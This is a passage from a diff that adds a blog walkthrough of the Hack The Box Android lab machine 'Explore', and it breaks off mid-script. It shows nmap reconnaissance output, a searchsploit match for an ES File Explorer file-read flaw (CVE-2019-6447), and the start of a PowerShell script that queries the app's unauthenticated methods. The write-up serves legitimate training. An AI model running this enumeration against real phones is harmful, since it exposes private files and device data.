@@ -1,0 +1,1186 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <!-- start custom head snippets -->
+<!-- Begin Jekyll GTM tag v1.0.3 -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-MF4PLJ5');</script>
+<!-- End Jekyll GTM tag v1.0.3 -->
+
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+<link rel="shortcut icon" href="/assets/images/favicon.ico" />
+
+<!-- Multilang tags -->
+
+    
+<link rel="alternate" hreflang="pt-BR" href="https://davicruz.com/walkthrough/2021/10/htb-explore">
+<link rel="alternate" hreflang="x-default" href="https://davicruz.com/walkthrough/2021/10/htb-explore">
+    
+
+    
+<link rel="alternate" hreflang="en-US" href="https://davicruz.com/en-US/walkthrough/2021/10/htb-explore">
+        
+<link rel="alternate" hreflang="en" href="https://davicruz.com/en-US/walkthrough/2021/10/htb-explore">
+        
+    
+
+
+<!-- end custom head snippets -->
+
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Walktrough: HTB Explore | Davi Cruz</title>
+<meta name="description" content="Hello guys!  This week’s machine will be Explore, an easy-rated Android box from Hack The Box, created by bertolis.">
+
+
+  <meta name="author" content="Davi Cruz">
+  
+  <meta property="article:author" content="Davi Cruz">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Davi Cruz">
+<meta property="og:title" content="Walktrough: HTB Explore">
+<meta property="og:url" content="https://davicruz.com/walkthrough/2021/10/htb-explore">
+
+
+  <meta property="og:description" content="Hello guys!  This week’s machine will be Explore, an easy-rated Android box from Hack The Box, created by bertolis.">
+
+
+
+  <meta property="og:image" content="https://i.imgur.com/TJKS5F6.png">
+
+
+
+  <meta name="twitter:site" content="@zerahzurc">
+  <meta name="twitter:title" content="Walktrough: HTB Explore">
+  <meta name="twitter:description" content="Hello guys!  This week’s machine will be Explore, an easy-rated Android box from Hack The Box, created by bertolis.">
+  <meta name="twitter:url" content="https://davicruz.com/walkthrough/2021/10/htb-explore">
+
+  
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="https://i.imgur.com/TJKS5F6.png">
+  
+
+  
+
+
+
+  <meta property="article:published_time" content="2021-10-30T13:00:00-03:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="https://davicruz.com/walkthrough/2021/10/htb-explore">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "Davi Cruz",
+      "url": "https://davicruz.com/",
+      "sameAs": ["https://twitter.com/zerahzurc","https://www.linkedin.com/in/davicruz","https://github.com/davi-cruz"]
+    
+  }
+</script>
+
+
+  <meta name="google-site-verification" content="hrWV-PqvbpxEy2HdpVYFQNws2Sz_tROleVyF18s2kWA" />
+
+
+  <meta name="msvalidate.01" content="60B1FA6CDAF15D226AB529AF30386BD8">
+
+
+
+  <meta name="yandex-verification" content="08de8d8c0326420f">
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Davi Cruz Feed">
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+  </head>
+
+  <body class="layout--single wide">
+    <!-- Begin Jekyll GTM tag v1.0.3 (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-MF4PLJ5" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Jekyll GTM tag v1.0.3 (noscript) -->
+
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        <!-- CUSTOM: Edit to adjust links to localized page -->
+        
+        
+          <a class="site-logo" href="/en-US"><img src="/assets/images/logo.png" alt="Davi Cruz"></a>
+        
+        <a class="site-title" href="/en-US">
+          Davi Cruz
+          
+        </a>
+        
+        <!-- END CUSTOM: Edit to adjust links to localized page -->
+        <ul class="visible-links">
+          <!-- CUSTOM: Edit to get localized navigation --><li class="masthead__menu-item">
+              <a href="/en-US/categories/">Categories</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/en-US/tag/">Tags</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/en-US/about/">About</a>
+            </li>
+<!-- END CUSTOM: Edit to get localized navigation -->
+        </ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <i class="fas fa-search"></i>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a href="https://davicruz.com/">
+        <img src="/assets/images/bio-photo.jpg" alt="Davi Cruz" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="https://davicruz.com/" itemprop="url">Davi Cruz</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        <p>Just another Cybersecurity professional</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name" class="p-locality">São Paulo, BR</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://linkedin.com/in/davicruz" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fab fa-linkedin" aria-hidden="true"></i><span class="label">Linkedin</span></a></li>
+          
+        
+          
+            <li><a href="https://twitter.com/zerahzurc" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/davi-cruz" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Walktrough: HTB Explore">
+    <meta itemprop="description" content="Hello guys!This week’s machine will be Explore, an easy-rated Android box from Hack The Box, created by bertolis.">
+    <meta itemprop="datePublished" content="2021-10-30T13:00:00-03:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title p-name" itemprop="headline">
+            <a href="https://davicruz.com/walkthrough/2021/10/htb-explore" class="u-url" itemprop="url">Walktrough: HTB Explore
+</a>
+          </h1>
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2021-10-30T13:00:00-03:00">October 30, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          5 minute read
+        
+      </span>
+    
+
+    <!-- CUSTOM: Post Meta attributes and links -->
+    <span class="page__meta-sep page__meta-lang"></span>
+    
+    
+    
+    <span class="page__meta-lang"><a href="/walkthrough/2021/10/htb-explore">Leia também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></span>
+    
+
+    
+
+    
+
+    
+    
+    
+    
+    
+  <span class="page__meta-sep page__meta-share"></span>
+  <span class="page__meta-share">
+    <i class="fas fa-share-alt" aria-hidden="true"></i>
+    <a href="#sharelinks">Share</a>
+  </span>
+    <!-- END CUSTOM: Post Meta attributes and links -->
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content e-content" itemprop="text">
+        
+        <p>Hello guys!</p>
+
+<p>This week’s machine will be <strong>Explore</strong>, an easy-rated Android box from <a href="https://www.hackthebox.eu/">Hack The Box</a>, created by <a href="https://app.hackthebox.eu/users/27897">bertolis</a>.<!--more--></p>
+
+<p class="notice--info"><img class="emoji" title=":information_source:" alt=":information_source:" src="https://github.githubassets.com/images/icons/emoji/unicode/2139.png" height="20" width="20"> <strong>Info</strong>: Write-ups for Hack The Box machines are posted as soon as they’re retired.</p>
+
+<p><img src="https://i.imgur.com/0cwBArJ.png" alt="HTB Explore" class="align-center"></p>
+
+<p>This was my first Android machine in HTB and, besides not having ADB access directly, I was able to get SSH access from information obtained through a vulnerable app.</p>
+
+<p>Hope you guys enjoy it!</p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>As usual, started with a quick <code class="language-plaintext highlighter-rouge">nmap</code> scan to see published ports on this box:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> quick 10.10.10.247
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-16 14:26 <span class="nt">-03</span>
+Nmap scan report <span class="k">for </span>10.10.10.247
+Host is up <span class="o">(</span>0.072s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 998 closed ports
+PORT     STATE    SERVICE VERSION
+2222/tcp open     ssh     <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| fingerprint-strings:
+|   NULL:
+|_    SSH-2.0-SSH Server - Banana Studio
+| ssh-hostkey:
+|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb <span class="o">(</span>RSA<span class="o">)</span>
+5555/tcp filtered freeciv
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port2222-TCP:V<span class="o">=</span>7.91%I<span class="o">=</span>7%D<span class="o">=</span>8/16%Time<span class="o">=</span>611A9FDB%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>NU
+SF:LL,24,<span class="s2">"SSH-2</span><span class="se">\.</span><span class="s2">0-SSH</span><span class="se">\x</span><span class="s2">20Server</span><span class="se">\x</span><span class="s2">20-</span><span class="se">\x</span><span class="s2">20Banana</span><span class="se">\x</span><span class="s2">20Studio</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>11.05 seconds
+</code></pre></div></div>
+
+<h3 id="5555tcp---freeciv">5555/TCP - freeciv</h3>
+
+<p>As this is my first Android box, started researching about this <code class="language-plaintext highlighter-rouge">freeciv</code> service found. Interestingly I came across a <a href="https://medium.com/@samsepio1/android4-vulnhub-writeup-3036f352640f">write-up for a VulnHub machine</a> that mentions that this port is used by ADB (Android Debug Bridge) but, differently from that one, this port is currently <strong>filtered</strong>. Let’s keep this information for now until we find a way to open it and get an interactive shell on the device.</p>
+
+<p>To look for any other missing information, ran another <code class="language-plaintext highlighter-rouge">nmap</code> scan, this time to check all TCP ports, and found the following additional ports open:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> allPorts 10.10.10.247
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
+Sarting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-16 14:44 <span class="nt">-03</span>
+Nmap scan report <span class="k">for </span>10.10.10.247
+Host is up <span class="o">(</span>0.070s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65530 closed ports
+PORT      STATE    SERVICE
+2222/tcp  open     EtherNetIP-1
+5555/tcp  filtered freeciv
+37425/tcp open     unknown
+42135/tcp open     unknown
+59777/tcp open     unknown
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>41.93 seconds
+<span class="nv">$ </span>nmap <span class="nt">-p37425</span>,42135,59777 <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> Full 10.10.10.247
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-16 14:47 <span class="nt">-03</span>
+Nmap scan report <span class="k">for </span>10.10.10.247
+Host is up <span class="o">(</span>0.071s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE VERSION
+37425/tcp open  unknown
+42135/tcp open  http    ES File Explorer Name Response httpd
+59777/tcp open  http    Bukkit JSONAPI httpd <span class="k">for </span>Minecraft game server 3.6.0 or older
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port37425-TCP:V<span class="o">=</span>7.91%I<span class="o">=</span>7%D<span class="o">=</span>8/16%Time<span class="o">=</span>611AA4D5%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>G
+SF:enericLines,AA,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\x</span><span class="s2">20400</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20Request</span><span class="se">\r\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20Mon,</span><span class="se">\x</span><span class="s2">20
+SF:16</span><span class="se">\x</span><span class="s2">20Aug</span><span class="se">\x</span><span class="s2">202021</span><span class="se">\x</span><span class="s2">2017:48:06</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">2022</span><span class="se">\r\n</span><span class="s2">Conten
+SF:t-Type:</span><span class="se">\x</span><span class="s2">20text/plain;</span><span class="se">\x</span><span class="s2">20charset=US-ASCII</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20Close</span><span class="se">\r\n\</span><span class="s2">
+SF:r</span><span class="se">\n</span><span class="s2">Invalid</span><span class="se">\x</span><span class="s2">20request</span><span class="se">\x</span><span class="s2">20line:</span><span class="se">\x</span><span class="s2">20"</span><span class="o">)</span>%r<span class="o">(</span>GetRequest,5C,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20412</span><span class="se">\</span><span class="s2">
+SF:x20Precondition</span><span class="se">\x</span><span class="s2">20Failed</span><span class="se">\r\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20Mon,</span><span class="se">\x</span><span class="s2">2016</span><span class="se">\x</span><span class="s2">20Aug</span><span class="se">\x</span><span class="s2">202021</span><span class="se">\x</span><span class="s2">2017:4
+SF:8:06</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">200</span><span class="se">\r\n\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>HTTPOptions,B5,<span class="s2">"HTTP/1</span><span class="se">\</span><span class="s2">
+SF:.0</span><span class="se">\x</span><span class="s2">20501</span><span class="se">\x</span><span class="s2">20Not</span><span class="se">\x</span><span class="s2">20Implemented</span><span class="se">\r\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20Mon,</span><span class="se">\x</span><span class="s2">2016</span><span class="se">\x</span><span class="s2">20Aug</span><span class="se">\x</span><span class="s2">202021</span><span class="se">\x</span><span class="s2">
+SF:2017:48:11</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">2029</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20text/pla
+SF:in;</span><span class="se">\x</span><span class="s2">20charset=US-ASCII</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20Close</span><span class="se">\r\n\r\n</span><span class="s2">Method</span><span class="se">\x</span><span class="s2">20not</span><span class="se">\x</span><span class="s2">2
+SF:0supported:</span><span class="se">\x</span><span class="s2">20OPTIONS"</span><span class="o">)</span>%r<span class="o">(</span>RTSPRequest,BB,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\x</span><span class="s2">20400</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20R
+SF:equest</span><span class="se">\r\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20Mon,</span><span class="se">\x</span><span class="s2">2016</span><span class="se">\x</span><span class="s2">20Aug</span><span class="se">\x</span><span class="s2">202021</span><span class="se">\x</span><span class="s2">2017:48:11</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Cont
+SF:ent-Length:</span><span class="se">\x</span><span class="s2">2039</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20text/plain;</span><span class="se">\x</span><span class="s2">20charset=US-ASCII</span><span class="se">\r</span><span class="s2">
+SF:</span><span class="se">\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20Close</span><span class="se">\r\n\r\n</span><span class="s2">Not</span><span class="se">\x</span><span class="s2">20a</span><span class="se">\x</span><span class="s2">20valid</span><span class="se">\x</span><span class="s2">20protocol</span><span class="se">\x</span><span class="s2">20version:
+SF:</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20RTSP/1</span><span class="se">\.</span><span class="s2">0"</span><span class="o">)</span>%r<span class="o">(</span>Help,AE,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\x</span><span class="s2">20400</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20Request</span><span class="se">\r\n</span><span class="s2">Da
+SF:te:</span><span class="se">\x</span><span class="s2">20Mon,</span><span class="se">\x</span><span class="s2">2016</span><span class="se">\x</span><span class="s2">20Aug</span><span class="se">\x</span><span class="s2">202021</span><span class="se">\x</span><span class="s2">2017:48:26</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\</span><span class="s2">
+SF:x2026</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20text/plain;</span><span class="se">\x</span><span class="s2">20charset=US-ASCII</span><span class="se">\r\n</span><span class="s2">Connection
+SF::</span><span class="se">\x</span><span class="s2">20Close</span><span class="se">\r\n\r\n</span><span class="s2">Invalid</span><span class="se">\x</span><span class="s2">20request</span><span class="se">\x</span><span class="s2">20line:</span><span class="se">\x</span><span class="s2">20HELP"</span><span class="o">)</span>%r<span class="o">(</span>SSLSessionReq
+SF:,DD,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\x</span><span class="s2">20400</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20Request</span><span class="se">\r\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20Mon,</span><span class="se">\x</span><span class="s2">2016</span><span class="se">\x</span><span class="s2">20Aug</span><span class="se">\x</span><span class="s2">
+SF:202021</span><span class="se">\x</span><span class="s2">2017:48:26</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">2073</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20
+SF:text/plain;</span><span class="se">\x</span><span class="s2">20charset=US-ASCII</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20Close</span><span class="se">\r\n\r\n</span><span class="s2">Invalid</span><span class="se">\</span><span class="s2">
+SF:x20request</span><span class="se">\x</span><span class="s2">20line:</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">16</span><span class="se">\x</span><span class="s2">03</span><span class="se">\0\0</span><span class="s2">S</span><span class="se">\x</span><span class="s2">01</span><span class="se">\0\0</span><span class="s2">O</span><span class="se">\x</span><span class="s2">03</span><span class="se">\0\?</span><span class="s2">G</span><span class="se">\?\?\?</span><span class="s2">,</span><span class="se">\?\?\?</span><span class="sb">`</span>~<span class="se">\?</span>
+SF:<span class="se">\0\?\?</span><span class="o">{</span><span class="se">\?\?\?\?</span>w<span class="se">\?\?\?\?</span>&lt;<span class="o">=</span><span class="se">\?</span>o<span class="se">\?\x</span>10n<span class="se">\0\0\(\0\x</span>16<span class="se">\0\x</span>13<span class="se">\0</span><span class="s2">")%r(TerminalSe
+SF:rverCookie,CA,"</span>HTTP/1<span class="se">\.</span>0<span class="se">\x</span>20400<span class="se">\x</span>20Bad<span class="se">\x</span>20Request<span class="se">\r\n</span>Date:<span class="se">\x</span>20Mon,<span class="se">\x</span>201
+SF:6<span class="se">\x</span>20Aug<span class="se">\x</span>202021<span class="se">\x</span>2017:48:26<span class="se">\x</span>20GMT<span class="se">\r\n</span>Content-Length:<span class="se">\x</span>2054<span class="se">\r\n</span>Content
+SF:-Type:<span class="se">\x</span>20text/plain<span class="p">;</span><span class="se">\x</span><span class="nv">20charset</span><span class="o">=</span>US-ASCII<span class="se">\r\n</span>Connection:<span class="se">\x</span>20Close<span class="se">\r\n\r</span>
+SF:<span class="se">\n</span>Invalid<span class="se">\x</span>20request<span class="se">\x</span>20line:<span class="se">\x</span>20<span class="se">\x</span>03<span class="se">\0\0\*</span>%<span class="se">\?\0\0\0\0\0</span>Cookie:<span class="se">\x</span>20msts
+SF:hash<span class="o">=</span>nmap<span class="s2">")%r(TLSSessionReq,DB,"</span>HTTP/1<span class="se">\.</span>0<span class="se">\x</span>20400<span class="se">\x</span>20Bad<span class="se">\x</span>20Request<span class="se">\r\n</span>D
+SF:ate:<span class="se">\x</span>20Mon,<span class="se">\x</span>2016<span class="se">\x</span>20Aug<span class="se">\x</span>202021<span class="se">\x</span>2017:48:26<span class="se">\x</span>20GMT<span class="se">\r\n</span>Content-Length:
+SF:<span class="se">\x</span>2071<span class="se">\r\n</span>Content-Type:<span class="se">\x</span>20text/plain<span class="p">;</span><span class="se">\x</span><span class="nv">20charset</span><span class="o">=</span>US-ASCII<span class="se">\r\n</span>Connectio
+SF:n:<span class="se">\x</span>20Close<span class="se">\r\n\r\n</span>Invalid<span class="se">\x</span>20request<span class="se">\x</span>20line:<span class="se">\x</span>20<span class="se">\x</span>16<span class="se">\x</span>03<span class="se">\0\0</span>i<span class="se">\x</span>01<span class="se">\0\0</span>
+SF:e<span class="se">\x</span>03<span class="se">\x</span>03U<span class="se">\x</span>1c<span class="se">\?\?</span>random1random2random3random4<span class="se">\0\0\x</span>0c<span class="se">\0</span>/<span class="se">\0</span><span class="s2">");
+Service Info: Device: phone
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 102.01 seconds
+</span></code></pre></div></div>
+
+<h3 id="42135tcp---es-file-explorer-name-response-httpd">42135/TCP - ES File Explorer Name Response httpd</h3>
+
+<p>Searching for this service in <code class="language-plaintext highlighter-rouge">searchsploit</code> got one result for the Android platform.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>searchsploit ES File Explorer
+<span class="nt">----------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                        |  Path
+<span class="nt">----------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ES File Explorer 4.1.9.7.4 - Arbitrary File Read                      | android/remote/50070.py
+iOS iFileExplorer Free - Directory Traversal                          | ios/remote/16278.py
+MetaProducts Offline Explorer 1.x - FileSystem Disclosure             | windows/remote/20488.txt
+Microsoft Internet Explorer / MSN - ICC Profiles Crash <span class="o">(</span>PoC<span class="o">)</span>          | windows/dos/1110.txt
+Microsoft Internet Explorer 4.x/5 / Outlook 2000 0/98 0/Express 4.x - | windows/remote/19603.txt
+Microsoft Internet Explorer 4/5 - DHTML Edit ActiveX Control File Ste | windows/remote/19094.txt
+Microsoft Internet Explorer 5 - ActiveX Object For Constructing Type  | windows/remote/19468.txt
+Microsoft Internet Explorer 5 / Firefox 0.8 / OmniWeb 4.x - URI Proto | windows/remote/24116.txt
+Microsoft Internet Explorer 5/6 - <span class="s1">'file://'</span> Request Zone Bypass       | windows/remote/22575.txt
+Microsoft Internet Explorer 6 - <span class="s1">'%USERPROFILE%'</span> File Execution        | windows/remote/22734.html
+Microsoft Internet Explorer 6 - Local File Access                     | windows/remote/29619.html
+Microsoft Internet Explorer 7 - Arbitrary File Rewrite <span class="o">(</span>MS07-027<span class="o">)</span>     | windows/remote/3892.html
+My File Explorer 1.3.1 iOS - Multiple Web Vulnerabilities             | ios/webapps/28975.txt
+WebFileExplorer 3.6 - <span class="s1">'user'</span> / <span class="s1">'pass'</span> SQL Injection                   | php/webapps/35851.txt
+<span class="nt">----------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+</code></pre></div></div>
+
+<h2 id="initial-access-and-user-flag">Initial Access and User flag</h2>
+
+<p>Checking this exploit, noticed that it relates to <strong>CVE-2019-6447</strong>, discussed in this post <strong><a href="https://medium.com/@knownsec404team/analysis-of-es-file-explorer-security-vulnerability-cve-2019-6447-7f34407ed566">Analysis of ES File Explorer Security Vulnerability (CVE-2019–6447) | by Knownsec 404 team | Medium</a></strong></p>
+
+<p>This vulnerability consists in a flaw that allow the execution of commands implemented by this app in an unauthenticated way, without the need of any kind of authorization. As it is simple, I have created a Powershell script to enumerate available information:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/pwsh</span><span class="w">
+
+</span><span class="nv">$methods</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@(</span><span class="s1">'listFiles'</span><span class="p">,</span><span class="s1">'listPics'</span><span class="p">,</span><span class="s1">'listVideos'</span><span class="p">,</span><span class="s1">'listAudios'</span><span class="p">,</span><span class="s1">'listAppsAll'</span><span class="p">,</span><span class="s1">'getDeviceInfo'</span><span class="p">)</span><span class="w">
+
+</span><span class="kr">foreach</span><span class="p">(</span><span class="nv">$method</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$methods</span><span class="p">){</span><span class="w">
+    </span><span class="n">Write-host</span><span class="w"> </span><span class="s2">"&gt;&gt;&gt; Method: </span><span class="nv">$method</span><span class="s2">"</span><span class="w"> </span><span class="nt">-foregroundcolor</span><span class="w"> </span><span class="nx">green</span><span class="w">
